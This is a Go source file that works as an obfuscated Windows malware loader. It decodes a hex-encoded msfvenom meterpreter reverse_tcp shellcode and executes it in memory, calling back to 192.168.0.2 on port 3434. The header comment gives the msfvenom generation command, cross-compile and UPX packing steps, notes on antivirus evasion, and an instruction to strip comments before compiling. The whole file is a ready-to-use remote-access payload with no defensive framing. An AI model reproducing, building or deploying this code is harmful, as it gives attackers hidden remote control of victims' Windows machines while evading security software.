package main

/*
dualfade --
golang reverse shell / semi obfuscated / hex payload --
remove all comments before compile !
Fri 05 Jul 2019 02:09:50 AM CDT
av evasion: 10.0.17763 N/A Build 17763
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.2 LPORT=3434 -b \x00 -f hex
GOOS=windows GOARCH=amd64 go build 3L9TALcw.go
upx compress 3L9TALcw.exe --brute
*/

import (
	"encoding/hex"
	BvamHES6YzeB "github.com/brimstone/go-shellcode"
)

func main() {
	QWNEov5MG := "4831c94881e9c0ffffff488d05efffffff48bbb942d3ed53110ed848315827482df8ffffffe2f4450a5009a3f9c2d8b94292bc12415c89ef0ae23f3659858ad90a58bf4b59858a990a589f0359016ff3089edc9a593f18157eb291513d2e99788bdeac52d0ec35eb0382a5d8432e53fb7e9bec83778fa0a149d1e2d6630ed8b9c9536553110e903c82a78a1b10de88320acba9d8512e91b89230bb1beec79932765ba552c743e9700ae22dff50cf11b403d22c6bf17b29f5419fc95b543709cc9a8ba9d8512a91b892b5acd81d469c3202cfa452c14f53bdca9bec83505699e11c8ab712494f81f8189b6ebf314f8a46a28bac0a4b4653abab9812acee53910735a0df0c223cd8b90385a4daf7465955e2d2ed5358873df0fed1ed5e7bce70b94092b91a98ea9430b392571f6628df46979f64b9790fd9b9428aace9388eb3b9bd068759505088e90fe2241e20ce9046829b649159f118f1cb12ace9fb010759bd06a5dad664c8f81a9f64b1598721f8f84a482770f10d3c82a7e71aeec0ad5caa40ed5311465b55529b64b15c3f11d34692b51b98f79903400a250ceedb5b4142adb81b92caf8e7cb2587135057b0b952d3ed124946514b0ae22412ab567ceaa72c381b98cd9130859edc9a588728f1cb09a5dae84f62bb9b1bb2acc48d20b93ffbb5124657b0b902d3ed124964d8e30369e67c1e3e276c158aace9646095d8bd06a4acdfe7e446bd2ca552d246f17f0a561b26a54f275e1ab9ed0a58c91a49f771bbacc40ed8"

	sb, err := hex.DecodeString(QWNEov5MG)
	g6tULG1GT8577(err)
	BvamHES6YzeB.Run(sb)
}

func g6tULG1GT8577(err error) {
	if err != nil {
		panic(err)
	}
}
